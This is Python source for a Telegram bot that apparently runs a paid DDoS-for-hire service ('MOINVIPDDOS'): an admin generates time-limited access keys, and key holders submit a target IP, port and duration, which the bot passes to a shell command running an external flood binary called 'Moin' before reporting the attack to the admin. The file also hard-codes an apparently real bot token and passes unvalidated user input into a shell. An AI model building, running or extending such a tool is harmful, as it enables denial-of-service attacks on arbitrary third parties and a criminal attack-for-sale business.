import telebot
import logging
import asyncio
import time
import json
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

# Configuration
TOKEN = '7343295464:AAEM7vk5K3cNXAywZC_Q11wmMzMu4gk09PU'  # Replace with your Bot's token
ADMIN_IDS = [6218253783]   # Replace with your Telegram User ID
USERNAME = "@MoinOwner"  # Replace with your bot's username
REQUEST_INTERVAL = 1  # Interval for the asyncio loop
USERS_FILE = 'users.json'
KEYS_FILE = 'keys.json'
ONGOING_ATTACKS = {}

# Initialize Bot
bot = telebot.TeleBot(TOKEN)
logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)

# Variables
attack_in_progress = True
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Load or Initialize Data
try:
    with open(USERS_FILE, 'r') as f:
        users = json.load(f)
except FileNotFoundError:
    users = []

try:
    with open(KEYS_FILE, 'r') as f:
        keys = json.load(f)
except FileNotFoundError:
    keys = {}

# Save Helper Function
def save_file(file_name, data):
    with open(file_name, 'w') as f:
        json.dump(data, f)

# Async Loop
loop = asyncio.get_event_loop()

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

# Notify Admin After Attack Completion
def notify_attack_finished(target_ip, target_port, duration):
    bot.send_message(
        ADMIN_IDS[0],
        f"✅ * 𝘼𝙏𝙏𝘼𝘾𝙆 𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀 * ✅\n\n"
        f"🎯 *𝙏𝘼𝙍𝙂𝙀𝙏->* `{target_ip}`\n"
        f"💣 *𝙋𝙊𝙍𝙏->* `{target_port}`\n"
        f"⏳ *𝙏𝙄𝙈𝙀->* `{duration}`\n\n"
        f"🚀 *𝙵𝙴𝙴𝙳𝙱𝙰𝙲𝙺 𝚂𝙴𝙽𝙳->* {USERNAME}",
        parse_mode='Markdown'
    )

# Async Attack Execution
async def run_attack_command_async(target_ip, target_port, duration):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./Moin {target_ip} {target_port} {duration} 500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            logging.info(f"❌ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙀𝙍𝙍𝙊𝙍-> {stdout.decode().strip()}")
        if stderr:
            logging.error(f"❌ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙀𝙍𝙍𝙊𝙍-> {stderr.decode().strip()}")
    except Exception as e:
        logging.error(f"❌ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙀𝙍𝙍𝙊𝙍-> {e}")
    finally:
        attack_in_progress = True
        notify_attack_finished(target_ip, target_port, duration)

# Command: Start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)
    options = ["🚀 START ATTACK", "🔍 ACCOUNT", "🔑 REDEEM KEY", "🔐 GENKEY", "🛑 STOP ATTACK"]
    buttons = [KeyboardButton(option) for option in options]
    markup.add(*buttons)

    bot.send_message(
        message.chat.id,
        f"🔥 *𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙋𝙍𝙄𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍*🔥\n"
        f"*𝘽𝙔 𝙏𝙊 𝘿𝙈*-> {USERNAME}",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda msg: msg.text == "🔐 GENKEY")
def gen_custom_key_command(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.send_message(message.chat.id, "🚫 𝙀𝙍𝙍𝙊𝙍 🚫")
        return
    bot.send_message(message.chat.id, "✅𝙐𝙎𝙀-> 𝙔𝙊𝙐𝙍 𝙉𝘼𝙈𝙀 30 𝙙𝙖𝙮𝙨")
    bot.register_next_step_handler(message, process_custom_key_generation)

def process_custom_key_generation(message):
    try:
        args = message.text.split()
        if len(args) != 3 or not args[1].isdigit():
            raise ValueError("❌ 𝙐𝙎𝙀-> 𝙔𝙊𝙐𝙍 𝙉𝘼𝙈𝙀 30 𝙙𝙖𝙮𝙨")

        key_name, time_amount, time_unit = args[0], int(args[1]), args[2].lower()
        if time_unit not in ['hours', 'days']:
            raise ValueError("Invalid time unit. Use 'hours' or 'days'.")

        expiry = datetime.now() + (timedelta(hours=time_amount) if time_unit == 'hours' else timedelta(days=time_amount))
        keys[key_name] = {"expiry": expiry.isoformat(), "redeemed": False}
        save_file(KEYS_FILE, keys)

        bot.send_message(message.chat.id, f"🔑 𝙂𝙀𝙉𝙆𝙀𝙔-> `{key_name}`\n⏳ 𝙑𝘼𝙇𝙄𝘿𝙄𝙏𝙔->  {expiry}", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(func=lambda msg: msg.text == "🔑 REDEEM KEY")
def redeem_key_command(message):
    bot.send_message(message.chat.id, "🔑 𝙀𝙉𝙏𝙀𝙍 𝙆𝙀𝙔")
    bot.register_next_step_handler(message, process_key_redeem)

def process_key_redeem(message):
    user_id = message.from_user.id
    key = message.text.strip()

    if any(user['user_id'] == user_id for user in users):
        bot.send_message(message.chat.id, "🚫 𝙀𝙍𝙍𝙊𝙍 🚫")
        return

    if key not in keys or keys[key]["redeemed"]:
        bot.send_message(message.chat.id, "🚫 𝙀𝙍𝙍𝙊𝙍 🚫")
        return

    keys[key]["redeemed"] = True
    expiry = keys[key]["expiry"]
    users.append({"user_id": user_id, "username": message.from_user.username, "expiry": expiry})
    save_file(KEYS_FILE, keys)
    save_file(USERS_FILE, users)

    bot.send_message(message.chat.id, f"🔑 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇 𝙆𝙀𝙔 𝙍𝙀𝘿𝙀𝙀𝙈\n𝙑𝘼𝙇𝙄𝘿𝙄𝙏𝙔-> {expiry}")

@bot.message_handler(func=lambda msg: msg.text == "🚀 START ATTACK")
def attack_command(message):
    if not any(user['user_id'] == message.from_user.id for user in users):
        bot.send_message(message.chat.id, "🔑 𝙉𝙊 𝘼𝙋𝙋𝙍𝙊𝙑𝘼𝙇 𝘽𝙀𝙔 𝙏𝙊 𝘿𝙈-> {USERNAME}")
        return
    bot.send_message(message.chat.id, "🚀 𝙐𝙎𝘼𝙂𝙀-> 𝙄𝙋 𝙋𝙊𝙍𝙏 𝙏𝙄𝙈𝙀")
    bot.register_next_step_handler(message, process_attack)

def process_attack(message):
    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id, "🚀 𝙐𝙎𝘼𝙂𝙀-> 𝙄𝙋 𝙋𝙊𝙍𝙏 𝙏𝙄𝙈𝙀")
        return

    try:
        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"🚫 𝙄𝙋 𝙋𝙊𝙍𝙏 𝘽𝙇𝙊𝘾𝙆𝙀𝘿 {target_port}")
            return

        if message.chat.id in ONGOING_ATTACKS:
            bot.send_message(message.chat.id, "🚫 𝙀𝙍𝙍𝙊𝙍 🚫")
            return

        ONGOING_ATTACKS[message.chat.id] = (target_ip, target_port, duration)
        asyncio.run_coroutine_threadsafe(
            run_attack_command_async(target_ip, target_port, duration), loop
        )
        bot.send_message(message.chat.id, f"🚀  𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏  🚀\n\n🎯 𝙏𝘼𝙍𝙂𝙀𝙏-> {target_ip}\n💣 𝙋𝙊𝙍𝙏->{target_port}\n⏳ 𝙏𝙄𝙈𝙀-> {duration}\n\n🚀 𝘽𝙔 𝙏𝙊 𝘿𝙈-> {USERNAME}")
    except ValueError:
        bot.send_message(message.chat.id, "🚫 𝙀𝙍𝙍𝙊𝙍 🚫")

@bot.message_handler(func=lambda msg: msg.text == "🛑 STOP ATTACK")
def stop_attack_command(message):
    if message.chat.id in ONGOING_ATTACKS:
        del ONGOING_ATTACKS[message.chat.id]
        bot.send_message(message.chat.id, "🛑 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 🛑")
    else:
        bot.send_message(message.chat.id, "❌ 𝙉𝙊 𝘼𝙏𝙏𝘼𝘾𝙆 𝙏𝙊 𝙎𝙏𝙊𝙋 ❌")

@bot.message_handler(func=lambda msg: msg.text == "🔍 ACCOUNT")
def handle_status_report(message):
    user = next((user for user in users if user['user_id'] == message.from_user.id), None)
    if user:
        response = (
            f"💰 *𝙔𝙊𝙐𝙍 𝘼𝘾𝘾𝙊𝙐𝙉𝙏*\n"
            f"👤 𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀-> @{user['username']}\n"
            f"⏳ 𝙑𝘼𝙇𝙄𝘿𝙄𝙏𝙔-> {user['expiry']}\n\n"
            f"🚀 𝘽𝙔 𝙏𝙊 𝘿𝙈-> {USERNAME}"
           
        )
    else:
        response = "🚫 𝙀𝙍𝙍𝙊𝙍 🚫"
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

# Async Loop Initialization
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

# Main Execution
if __name__ == "__main__":
    Thread(target=start_asyncio_thread, daemon=True).start()
    logging.info("🚀 MOINVIPDDOS")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            time.sleep(5)